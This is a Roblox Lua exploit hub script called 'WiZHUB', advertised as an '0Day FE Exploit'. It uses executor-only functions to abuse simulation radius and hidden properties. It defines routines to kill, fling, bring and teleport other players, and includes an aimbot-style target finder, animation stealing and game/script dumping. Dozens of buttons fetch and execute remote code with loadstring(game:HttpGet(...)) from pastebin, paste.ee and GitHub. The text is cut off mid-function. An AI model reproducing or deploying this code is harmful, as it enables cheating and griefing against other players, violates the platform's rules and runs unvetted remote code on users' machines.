if not game:IsLoaded() then
    game:IsLoaded():Wait()
end

local speaker = game.Players.LocalPlayer
local plr = game.Players.LocalPlayer
local playerlp = plr
local Characterlp = plr.Character
local Area = game:GetService("Workspace")
local players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local coregui = game:GetService("CoreGui")
local Mouse = plr:GetMouse()
local MyView = Area.CurrentCamera
local MyTeamColor = plr.TeamColor
local HoldingM2 = false
local Active = false
local Lock = false
local Epitaph = .187 ---Note: The Bigger The Number, The More Prediction.
local HeadOffset = Vector3.new(0, .1, 0)
Players = game:GetService("Players")
IYMouse = Players.LocalPlayer:GetMouse()
UserInputService = game:GetService("UserInputService")
autoclicking = false
local WalkTo = false
local Guarding = false
local Flinging = false
local Platformstand = false
local viewing = nil
local Control = false
local Lagging = false
local AutoObby = false
local invisRunning = false
local IsInvis = false
local IsRunning = true
local invisFix
local invisDied
local InvisibleCharacter
local CF
local Clip = true
local Regulars = false
local vnoclipParts = {}
local FlingTBL = {}
local frozenParts = {}
local vfreeze = {}
local RestoreCFling = {}
local shownParts = {}
local showninParts = {}
local showninvParts = {}
local shownvisParts = {}
local vstrongParts = {}
local vweakParts = {}
local highlights = {}
local workspace = game.Workspace
local Noclipping = nil
local viewDied
local viewChanged
local triggermd
local triggermp
local cancelAutoClick
local highlight
local highlight2
local closesttouch = nil
local closestclick = nil
local closestprox = nil
local closestseat = nil
local lockcursorman
local unlockcursorman
local fakekicktbl
CFloop = nil
CFspeed = 50
simRadius = false
FLYING = false
QEfly = true
NOWW = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").WalkSpeed
NOWJ = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").JumpPower
NOWG = game.Workspace.Gravity
NOWH = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").HipHeight
iyflyspeed = 1
PlayerVolumeBELIKE = UserSettings():GetService("UserGameSettings").MasterVolume
PlayerGraphicsBELIKE = settings().Rendering.QualityLevel
vehicleflyspeed = 1
local HumanModCons = {}
local flyjump
local simRadLoop
local stareLoop
local currentToolSize = ""
local currentGripPos = ""
local invisRunning = false
local noSit
local nositDied
local proxDied = nil
local clickDied = nil
local selclick = nil
local seltouch = nil
local selprox = nil
local selseat = nil
local selinvisp = nil
local selcanc = nil
local YesRefresh = false
local sethidden = sethiddenproperty or set_hidden_property or set_hidden_prop
local setsimulation = setsimulationradius or set_simulation_radius

function round(num, numDecimalPlaces)
	local mult = 10^(numDecimalPlaces or 0)
	return math.floor(num * mult + 0.5) / mult
end

function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end

function SimRad()
   if sethidden then		
		simRadLoop = game:GetService('RunService').Stepped:Connect(function()
			if setsimulation then
				setsimulation(1e308, 1/0)
			else	
				sethidden(plr,"MaximumSimulationRadius",1/0)
				sethidden(plr,"SimulationRadius", 1e308)
			end
		end)
		simRadius = true
	end
end

function toClipboard(String)
	local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
	if clipBoard then
		clipBoard(String)
	end
end

local function CursorLock()
	UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
end
local function UnLockCursor()
	HoldingM2 = false Active = false Lock = false 
	UIS.MouseBehavior = Enum.MouseBehavior.Default
end
function FindNearestPlayer()
	local dist = math.huge
	local Target = nil
	for _, v in pairs(game.Players:GetPlayers()) do
		if v ~= plr and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").Health > 0 and getRoot(v.Character) and v then
			local TheirCharacter = v.Character
			local CharacterRoot, Visible = MyView:WorldToViewportPoint(getRoot(TheirCharacter).Position)
			if Visible then
				local RealMag = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(CharacterRoot.X, CharacterRoot.Y)).Magnitude
				if RealMag < dist and RealMag < FOVCircle.Radius then
					dist = RealMag
					Target = TheirCharacter
				end
			end
		end
	end
	return Target
end

function Noclip()
   Clip = false
	function NoclipLoop()
		if Clip == false and plr.Character ~= nil then
			for _, child in pairs(plr.Character:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true then
					child.CanCollide = false
				end
			end
		end
	end
	Noclipping = game:GetService('RunService').Stepped:connect(NoclipLoop)
end

function TurnsVisible()
		if IsInvis == false then return end
		invisFix:Disconnect()
		invisDied:Disconnect()
		CF = game.Workspace.CurrentCamera.CFrame
		Characterlp = Characterlp
		local CF_1 = playerlp.Character.HumanoidRootPart.CFrame
		Characterlp.HumanoidRootPart.CFrame = CF_1
		InvisibleCharacter:Destroy()
		playerlp.Character = Characterlp
		Characterlp.Parent = workspace
		IsInvis = false
		playerlp.Character.Animate.Disabled = true
		playerlp.Character.Animate.Disabled = false
		invisDied = Characterlp:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
			invisRespawn()
			invisDied:Disconnect()
		end)
		invisRunning = false
	end

function invisRespawn()
		IsRunning = false
		if IsInvis == true then
			pcall(function()
				playerlp.Character = Characterlp
				wait()
				Characterlp.Parent = game.Workspace
				Characterlp:FindFirstChildWhichIsA'Humanoid':Destroy()
				IsInvis = false
				InvisibleCharacter.Parent = nil
				invisRunning = false
			end)
		elseif IsInvis == false then
			pcall(function()
				playerlp.Character = Characterlp
				wait()
				Characterlp.Parent = game.Workspace
				Characterlp:FindFirstChildWhichIsA'Humanoid':Destroy()
				TurnsVisible()
			end)
		end
	end

function TurnVisible()
		if IsInvis == false then return end
		invisFix:Disconnect()
		invisDied:Disconnect()
		CF = game.Workspace.CurrentCamera.CFrame
		Characterlp = Characterlp
		local CF_1 = playerlp.Character.HumanoidRootPart.CFrame
		Characterlp.HumanoidRootPart.CFrame = CF_1
		InvisibleCharacter:Destroy()
		playerlp.Character = Characterlp
		Characterlp.Parent = workspace
		IsInvis = false
		playerlp.Character.Animate.Disabled = true
		playerlp.Character.Animate.Disabled = false
		invisDied = Characterlp:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
			invisRespawn()
			invisDied:Disconnect()
		end)
		invisRunning = false
	end

function fixcam()
   game.Workspace.CurrentCamera:Remove()
	wait(.1)
	repeat wait() until plr.Character ~= nil
	game.Workspace.CurrentCamera.CameraSubject = plr.Character:FindFirstChildWhichIsA('Humanoid')
	game.Workspace.CurrentCamera.CameraType = "Custom"
	plr.CameraMinZoomDistance = 0.5
	plr.CameraMaxZoomDistance = 400
	plr.CameraMode = "Classic"
	plr.Character.Head.Anchored = false
end

function respawn(plr)
	if invisRunning then TurnVisible() end
	local char = plr.Character
	if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
	char:ClearAllChildren()
	local newChar = Instance.new("Model")
	newChar.Parent = workspace
	plr.Character = newChar
	wait()
	plr.Character = char
	newChar:Destroy()
end

function refresh(plr)
	local Human = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid", true)
	local pos = Human and Human.RootPart and Human.RootPart.CFrame
	local pos1 = game.Workspace.CurrentCamera.CFrame
	respawn(plr)
	task.spawn(function()
		speaker.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart.CFrame, workspace.CurrentCamera.CFrame = pos, wait() and pos1
	end)
end

function tools(plr)
	if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
		return true
	end
end

function attach(speaker,target)
	if tools(speaker) then
		local char = speaker.Character
		local tchar = target.Character
		local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
		local hrp = getRoot(speaker.Character)
		local hrp2 = getRoot(target.Character)
		hum.Name = "1"
		local newHum = hum:Clone()
		newHum.Parent = char
		newHum.Name = "Humanoid"
		wait()
		hum:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = char
		newHum.DisplayDistanceType = "None"
		local tool = speaker:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass("Tool") or speaker.Character:FindFirstChildOfClass("Tool")
		tool.Parent = char
		hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) * CFrame.new(math.random(-100, 100)/200,math.random(-100, 100)/200,math.random(-100, 100)/200)
		local n = 0
		repeat
			wait(.1)
			n = n + 1
			hrp.CFrame = hrp2.CFrame
		until (tool.Parent ~= char or not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or n > 250) and n > 2
	else
		game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4,})
	end
end

function bring(speaker,target,fast)
	if tools(speaker) then
		if target ~= nil then
			local NormPos = getRoot(speaker.Character).CFrame
			if not fast then
				refresh(speaker)
				wait()
				repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
				wait(0.3)
			end
			local hrp = getRoot(speaker.Character)
			attach(speaker,target)
			repeat
				wait()
				hrp.CFrame = NormPos
			until not getRoot(target.Character) or not getRoot(speaker.Character)
			wait(1)
			plr.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
		end
	else
		game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4,})
	end
end

function kill(speaker,target,fast)
	if tools(speaker) then
		if target ~= nil then
			local NormPos = getRoot(speaker.Character).CFrame
			if not fast then
				refresh(speaker)
				wait()
				repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
				wait(0.3)
			end
			local hrp = getRoot(speaker.Character)
			attach(speaker,target)
			repeat
				wait()
				hrp.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 5,999999)
			until not getRoot(target.Character) or not getRoot(speaker.Character)
			wait(1)
			speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
		end
	else
		game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4,})
	end
end

function teleport(speaker,target,target2,fast)
	if tools(speaker) then
		if target ~= nil then
			local NormPos = getRoot(speaker.Character).CFrame
			if not fast then
				refresh(speaker)
				wait()
				repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
				wait(0.3)
			end
			local hrp = getRoot(speaker.Character)
			local hrp2 = getRoot(target2.Character)
			attach(speaker,target)
			repeat
				wait()
				hrp.CFrame = hrp2.CFrame
			until not getRoot(target.Character) or not getRoot(speaker.Character)
			wait(1)
			speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
		end
	else
		game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4,})
	end
end

function GetPlayer(String)
	local Foundplr = {}
	local strl = String:lower()
	if strl == "all" then
		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			table.insert(Foundplr,v)
		end
	elseif strl == "others" then
		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v.Name ~= plr.Name then
				table.insert(Foundplr,v)
			end
		end
	elseif strl == "me" then
		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v.Name == plr.Name then
				table.insert(Foundplr,v)
			end
		end
	else
		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v.DisplayName:lower():sub(1, #String) == String:lower() or v.Name:lower():sub(1, #String) == String:lower() then
				table.insert(Foundplr,v)
			end
		end
	end
	return Foundplr
end

function GetNPC(String)
      local FoundNPC = {}
	  local strl = String:lower()
             for i,v in pairs(game.Workspace:GetDescendants()) do do
			 if v:IsA("Model") and v.Name:lower():sub(1, #String) == String:lower() then
				table.insert(FoundNPC,v)
			end
		end
	end
	return FoundNPC
end

local function align(part0,part1)
	local attachment0 = Instance.new("Attachment",part1)
	local attachment1 = Instance.new("Attachment",part0)
	
	local alignpos = Instance.new("AlignPosition",part0)
	alignpos.MaxForce = math.huge
	alignpos.Responsiveness = 200
	alignpos.Attachment0 = attachment0
	alignpos.Attachment1 = attachment1
end

local function fling(part0)
	local vel = Instance.new("BodyAngularVelocity",part0)
	vel.AngularVelocity = Vector3.new(1,1,1)*999
	vel.MaxTorque = Vector3.new(1,1,1)*9999
end

local function loadcharacter(character)
	local scf = character.HumanoidRootPart.CFrame
	character.HumanoidRootPart.CFrame = scf*CFrame.new(0,100,0)
	character.HumanoidRootPart.Anchored = true

	wait(1)

	local fakec = Instance.new("Model",workspace)
	
	local froot = Instance.new("Part",fakec)
	froot.Name = "HumanoidRootPart"
	froot.Size = Vector3.new(1,5,1)
	froot.CFrame = scf
	froot.Transparency = 0.5
	
	Instance.new("Humanoid",fakec)
	
	plr.Character = fakec
	workspace.CurrentCamera.CameraSubject = fakec.Humanoid
	
	align(froot,character.HumanoidRootPart)
	
	character.Humanoid:Destroy()

	for _,p in pairs(character:GetDescendants()) do
		if p:IsA("BasePart") then
			p.CanCollide = false
			p.Massless = true
		elseif p:IsA("BodyGyro") or p:IsA("BodyAngularVelocity") or p:IsA("BodyVelocity") then
			p:Destroy()
		end
	end
	
	game.RunService.Heartbeat:Connect(function()
		for _,p in pairs(character:GetDescendants()) do
		if p:IsA("BasePart") then
			p.CanCollide = false
			p.Massless = true
			p.Anchored = false
		elseif p:IsA("Weld")then
			p.Enabled = false
		end
	end
	end)

	
	wait()
	
	wait(1)
	fling(character.HumanoidRootPart)
end

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "WiZHUB", HidePremium = false, IntroText = "WiZHUB", SaveConfig = true, ConfigFolder = "OrionTest"})

local Info = Window:MakeTab({
	Name = "Information",
	Icon = "rbxassetid://6026568227",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local AdminS = Window:MakeTab({
	Name = "Admin Scripts",
	Icon = "rbxassetid://6034281908",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local GameView = Window:MakeTab({
	Name = "Game Viewers",
	Icon = "rbxassetid://6034227061",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local RSpy = Window:MakeTab({
	Name = "Remote Spies",
	Icon = "rbxassetid://6035202016",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local Player = Window:MakeTab({
	Name = "Players",
	Icon = "rbxassetid://6034281935",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local LP = Window:MakeTab({
	Name = "LocalPlayer",
	Icon = "rbxassetid://6023426915",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local NPC = Window:MakeTab({
	Name = "NPCs",
	Icon = "rbxassetid://6034287516",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local Vehicle = Window:MakeTab({
	Name = "Vehicle",
	Icon = "rbxassetid://6034754441",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local ToolPlr = Window:MakeTab({
	Name = "Tools",
	Icon = "rbxassetid://6034744057",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local ESP = Window:MakeTab({
	Name = "ESP",
	Icon = "rbxassetid://6031075931",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local Bypass = Window:MakeTab({
	Name = "Bypasses",
	Icon = "rbxassetid://6031360355",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local Function = Window:MakeTab({
	Name = "Functions",
	Icon = "rbxassetid://6023426952",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local Script = Window:MakeTab({
	Name = "Scripts",
	Icon = "rbxassetid://6031763428",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local Setting = Window:MakeTab({
	Name = "Settings",
	Icon = "rbxassetid://6034509993",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local TablePart = Window:MakeTab({
	Name = "Table Parts",
	Icon = "rbxassetid://6035202010",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local Math = Window:MakeTab({
	Name = "Math Calculator",
	Icon = "rbxassetid://6035047384",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local ExploitDoc = Window:MakeTab({
	Name = "Exploit Docs",
	Icon = "rbxassetid://6035053285",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

local Credit = Window:MakeTab({
	Name = "Credits",
	Icon = "rbxassetid://6035202033",
	PremiumOnly = false --- Set true, if you want to this tab was only for premium people, or false to all could use this.
})

Info:AddParagraph("The Exploit", "Welcome to WiZHUB. This is an exclusive 0Day FE Exploit Script provided to members of the PepeCity. WiZHUB provides the best leading Bypasses, Exploits, Scripts, and much more. This will be the only tool you will ever truely need. ")
Info:AddParagraph("Buttons doesn't show up.", "If buttons doesn't show up for you, then it's wrong moment. You need to be alive not dead. Also not hold any tool or you gonna get error in dev console and script may not work. But if still not work, try to reset the GUI or rejoin the server. If samething, then the script can't support for your exploit. Use paid exploits, for example synapse x, scriptware or free one - krnl, oxygen x, electron, etc.")
Info:AddParagraph("How do I use Textbox in GUI?", "Textbox used to change value or write player name. For example in Players Folder you need to write player name [can be shortend] or Fly Speed [Use numbers]. It's very easy, each of you will easily understand it and will use it without any trouble.")

AdminS:AddButton({
	Name = "Infinite Yield",
	Callback = function()
      	loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
  	end    
})

AdminS:AddButton({
	Name = "CMD-X",
	Callback = function()
      	loadstring(game:HttpGet('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source', true))()
  	end    
})

AdminS:AddButton({
	Name = "Reviz",
	Callback = function()
      	loadstring(game:HttpGet('https://pastebin.com/raw/Nh7n0hdX', true))()
  	end    
})

AdminS:AddButton({
	Name = "Shattervast",
	Callback = function()
      	loadstring(game:HttpGet('https://pastebin.com/raw/iL4NRDux', true))()
  	end    
})

AdminS:AddButton({
	Name = "Fates",
	Callback = function()
      	loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
  	end    
})

AdminS:AddButton({
	Name = "Adonis",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/HYshM"))();
  	end    
})

AdminS:AddButton({
	Name = "Homebrew",
	Callback = function()
      	_G.CustomUI = false
loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
  	end    
})

AdminS:AddButton({
	Name = "Kohls",
	Callback = function()
      	loadstring(game:HttpGet("https://pastebin.com/raw/237ERiAT"))();
  	end    
})

AdminS:AddButton({
	Name = "IceGear",
	Callback = function()
loadstring(game:HttpGet(('https://paste.ee/r/e6T8l'),true))()
  	end    
})

AdminS:AddButton({
	Name = "Overflow v3",
	Callback = function()
loadstring(game:HttpGet(('https://paste.ee/r/KaeZg'),true))()
  	end    
})

AdminS:AddButton({
	Name = "Ultimate",
	Callback = function()
      	loadstring(game:HttpGet("https://pastebin.com/raw/bVjM0xCS", true))()
  	end    
})

AdminS:AddButton({
	Name = "Unfair Hub",
	Callback = function()
      	loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
  	end    
})

AdminS:AddButton({
	Name = "Sim Hub",
	Callback = function()
      	loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/roadpepe/SimHub/main/Launcher.lua'))()
  	end    
})

AdminS:AddButton({
	Name = "Saza Hub",
	Callback = function()
      	loadstring(game:HttpGet"https://rawscripts.net/raw/SAZA-HUB_496")()
  	end    
})

GameView:AddButton({
	Name = "Dark Dex v3",
	Callback = function()
      	loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
  	end    
})

GameView:AddButton({
	Name = "Synapse x Dark Dex",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/ViHra", true))()
  	end    
})

GameView:AddButton({
	Name = "Sentinel Dex",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/RugPl", true))()
  	end    
})

GameView:AddButton({
	Name = "Script Viewer",
	Callback = function()
      	loadstring(game:HttpGet("https://pastebin.com/raw/dva01xpE", true))()
  	end    
})

GameView:AddButton({
	Name = "Script Dumper",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/6oXCo", true))()
  	end    
})

GameView:AddButton({
	Name = "Synapse x Script Dumper",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/vmuSu", true))()
  	end    
})

GameView:AddButton({
	Name = "Save Game",
	Callback = function()
      	saveinstance()
  	end    
})

RSpy:AddButton({
	Name = "RemoteSpy",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/9N1Fc", true))()
  	end    
})

RSpy:AddButton({
	Name = "DarkSpy",
	Callback = function()
      	loadstring(game:HttpGet("https://pastebin.com/raw/SwZq0zCf"))()
  	end    
})

RSpy:AddButton({
	Name = "FilterShark",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/Fffa4"))()
  	end    
})

RSpy:AddButton({
	Name = "FrostHook",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/z29rx"))()
  	end    
})

RSpy:AddButton({
	Name = "EngoSpy",
	Callback = function()
      	local settings = {
   saveCalls = false,
   maxCallsSaved = 1000,
   saveOnlyLastCall = true,
   maxTableDepth = 100,
   minimizeBind = Enum.KeyCode.RightAlt,
   blacklistedNames = {}
}
loadstring(game:HttpGet("https://paste.ee/r/jsyu2"))(settings)
  	end    
})

RSpy:AddButton({
	Name = "Hydroxide",
	Callback = function()
      	local owner = "Upbolt"
local branch = "revision"

local function webImport(file)
    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
end

webImport("init")
webImport("ui/main")
  	end    
})

RSpy:AddButton({
	Name = "MrSpy v2",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/z06zN"))()
  	end    
})

RSpy:AddButton({
	Name = "SimpleSpy v2.2",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/nfHwB"))()
  	end    
})

RSpy:AddButton({
	Name = "Remote Grabber",
	Callback = function()
      	loadstring(game:HttpGet("https://paste.ee/r/Dddcj"))()
  	end    
})

Player:AddLabel("Player")

local PlayerTarget
local PlayerTargettwo

Player:AddTextbox({
	Name = "Player Name",
	Default = "",
	TextDisappear = true,
	Callback = function(Walktofollow)
		local Target = unpack(GetPlayer(Walktofollow))
		PlayerTarget = Target
	end		  
})

Player:AddToggle({
	Name = "Walk To Player",
	Default = false,
	Callback = function(Walkn)
        if Walkn == true then
            if plr.Character:FindFirstChildOfClass('Humanoid') and plr.Character:FindFirstChildOfClass('Humanoid').SeatPart then
		plr.Character:FindFirstChildOfClass('Humanoid').Sit = false
		wait(.1)
	end
	    if WalkTo == false then
		WalkTo = true
		repeat wait()
		     plr.Character:FindFirstChild("Humanoid"):MoveTo(getRoot(PlayerTarget.Character).Position)
			 until PlayerTarget.Character == nil or not getRoot(PlayerTarget.Character) or WalkTo == false	
	end
		else
		    Walkn = false
			WalkTo = false
		end		
  end    
})

Player:AddToggle({
	Name = "Pathfind Walk To Player",
	Default = false,
	Callback = function(Walkns)
        if Walkns == true then
            WalkTo = false
	local PathService = game:GetService("PathfindingService")
	local hum = plr.Character:FindFirstChildOfClass("Humanoid")
	local path = PathService:CreatePath()
	
	if WalkTo == false then
		WalkTo = true
	repeat wait()
		local success, response = pcall(function()
			path:ComputeAsync(getRoot(plr.Character).Position, getRoot(PlayerTarget.Character).Position)
			local waypoints = path:GetWaypoints()
			local distance 
			for waypointIndex, waypoint in pairs(waypoints) do
				local waypointPosition = waypoint.Position
				hum:MoveTo(waypointPosition)
				repeat 
					distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
					wait()
				until
				distance <= 5
			end	 
		end)
		if not success then
			plr.Character:FindFirstChildOfClass('Humanoid'):MoveTo(getRoot(PlayerTarget.Character).Position)
		end
		until PlayerTarget.Character == nil or not getRoot(PlayerTarget.Character) or WalkTo == false
		end
		else
		    Walkns = false
			WalkTo = false
		end		
  end    
})

Player:AddToggle({
	Name = "Walk To Tool Player",
	Default = false,
	Callback = function(Walknss)
        if Walknss == true then
           if Guarding == false then
              Guarding = true
                    repeat wait()
                    if getRoot(PlayerTarget.Character).Velocity.Magnitude > 0.5 and PlayerTarget.Character:FindFirstChildOfClass("Tool") then
                       plr.Character:FindFirstChildOfClass("Humanoid"):MoveTo(getRoot(PlayerTarget.Character).CFrame.p + getRoot(PlayerTarget.Character).Velocity.unit * 7)
                    elseif getRoot(PlayerTarget.Character).Velocity.Magnitude < 0.5 and PlayerTarget.Character:FindFirstChildOfClass("Tool") then
		     plr.Character:FindFirstChild("Humanoid"):MoveTo(getRoot(PlayerTarget.Character).CFrame.p)
end
                    until PlayerTarget.Character == nil or not getRoot(PlayerTarget.Character) or not PlayerTarget.Character:FindFirstChildOfClass("Tool") or Guarding == false
		  end
                   
		else
		    Walknss = false
            Guarding = false
		end		
  end    
})

Player:AddToggle({
	Name = "Animation Steal Player",
	Default = false,
	Callback = function(animsteals)
        if animsteals == true then
            if not plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
               return game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You can't steal in R6 games. You need to be in R15 games - R15 is required!", Duration = 5,})
			end
			if not PlayerTarget.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
               return game.StarterGui:SetCore("SendNotification", {Title = "Oops.", Text = "The player in R6 animation. Try to write other player target name. Your playertarget should be in R15 Animation - Player R15 is required!", Duration = 15,})
			end
			if PlayerTarget.Character:FindFirstChild("Animate") then
		if plr.Character:FindFirstChild("Animate") then
				checkifmyanim = plr.Character:FindFirstChild("animstorage")
			if checkifmyanim then
				local z = plr.Character:FindFirstChild("Animate")
				if z then 
				   z:Destroy() 
				end
				checkifmyanim.Name = "Animate"
				checkifmyanim.Disabled = false
			end
		end
		local z = plr.Character:FindFirstChild("Animate")
		if z then
			z.Name = "animstorage"
			z.Disabled = true
		end
		local newanim = PlayerTarget.Character.Animate:Clone()
		newanim.Parent = plr.Character
		newanim.Name = "Animate"
			end
		else
		    animsteals = false
			if game.Players.LocalPlayer.Character:FindFirstChild("animstorage") then
		if game.Players.LocalPlayer.Character:FindFirstChild("Animate") then
			game.Players.LocalPlayer.Character:FindFirstChild("Animate"):Destroy()
		end
		local as = game.Players.LocalPlayer.Character:FindFirstChild("animstorage")
		as.Name = "Animate"
		as.Disabled = false
		end
		end
  end   
})

Player:AddButton({
	Name = "unAnchored Parts to Player",
	Callback = function()
      	if sethidden then
			local Forces = {}
			for _,part in pairs(game.Workspace:GetDescendants()) do
				if PlayerTarget.Character:FindFirstChild("Head") and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(plr.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
					for i,c in pairs(part:GetChildren()) do
						if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
							c:Destroy()
						end
					end
					local ForceInstance = Instance.new("BodyPosition")
					ForceInstance.Parent = part
					ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
					table.insert(Forces, ForceInstance)
					if not table.find(frozenParts,part) then
						table.insert(frozenParts,part)
					end
				end
			end
			if not simRadius then
				SimRad()
			end
			for i,c in pairs(Forces) do
				c.Position = PlayerTarget.Character.Head.Position
			end
		end
	end    
})

Player:AddButton({
	Name = "Teleport To Player",
	Callback = function()
      	plr.Character.HumanoidRootPart.CFrame = getRoot(PlayerTarget.Character).CFrame
  	end    
})

Player:AddButton({
	Name = "Vehicle Teleport to Player",
	Callback = function()
		if PlayerTarget.Character ~= nil then
			local seat = plr.Character:FindFirstChildOfClass('Humanoid').SeatPart
			local vehicleModel = seat.Parent
			repeat
				if vehicleModel.ClassName ~= "Model" then
					vehicleModel = vehicleModel.Parent
				end
			until vehicleModel.ClassName == "Model"
			for i,v in pairs(vehicleModel.Parent:GetDescendants()) do
				if v:IsA("BasePart") and v.Anchored then
					if v.Anchored == false then
				   v:MoveTo(getRoot(PlayerTarget.Character).Position)
					end
				end   
			end
			wait(0.1)
			vehicleModel:MoveTo(getRoot(PlayerTarget.Character).Position)
	end
	end    
})

Player:AddButton({
	Name = "Fling Noclipped Player",
	Callback = function()
flinghh = 1000
local lp = game.Players.LocalPlayer

if type(PlayerTarget) == "string" then return end

local oldpos = lp.Character.HumanoidRootPart.CFrame
local oldhh = lp.Character.Humanoid.HipHeight

local carpetAnim = Instance.new("Animation")
carpetAnim.AnimationId = "rbxassetid://282574440"
carpet = lp.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(carpetAnim)
carpet:Play(.1, 1, 1)

local carpetLoop

local tTorso = PlayerTarget.Character:FindFirstChild("Torso") or PlayerTarget.Character:FindFirstChild("LowerTorso") or PlayerTarget.Character:FindFirstChild("HumanoidRootPart")

spawn(function()
    carpetLoop = game:GetService('RunService').Heartbeat:Connect(function()
	    pcall(function()
	        if tTorso.Velocity.magnitude <= 28 then -- if target uses netless just target their local position
    	        local pos = {x=0, y=0, z=0}
        		pos.x = tTorso.Position.X
        		pos.y = tTorso.Position.Y
        		pos.z = tTorso.Position.Z
        		pos.x = pos.x + tTorso.Velocity.X / 2
        		pos.y = pos.y + tTorso.Velocity.Y / 2
